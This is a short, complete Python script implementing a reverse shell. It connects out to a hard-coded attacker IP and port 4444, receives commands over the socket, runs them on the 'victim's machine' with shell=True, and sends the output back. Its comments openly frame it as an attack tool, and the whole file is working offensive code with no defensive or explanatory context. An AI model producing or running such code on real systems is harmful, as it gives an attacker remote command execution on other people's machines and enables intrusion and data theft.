import socket
import os
import subprocess
import platform

# Function to start the reverse shell
def reverse_shell(target_ip, target_port):
    try:
        # Creating a socket object to connect back to the attacker's machine
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        
        # Redirecting the input/output of the shell to the socket
        while True:
            # Receive command from the attacker
            command = s.recv(1024)
            if command.lower() == b'exit':
                break
            
            # Execute the command on the victim's machine
            output = subprocess.run(command, shell=True, capture_output=True)
            
            # Send the command output back to the attacker
            s.send(output.stdout + output.stderr)
        
        s.close()
    except Exception as e:
        print(f"Error in reverse shell: {e}")

# Main function to run everything
if __name__ == "__main__":
    # Get local IP of the attacker
    attacker_ip = "192.168.63.240"
    print(f"Attacker's IP Address: {attacker_ip}")
    
    # Set port to listen on (same as the listener setup)
    attacker_port = 4444  # Adjust if needed
    
    # Set the reverse shell
    reverse_shell(attacker_ip, attacker_port)
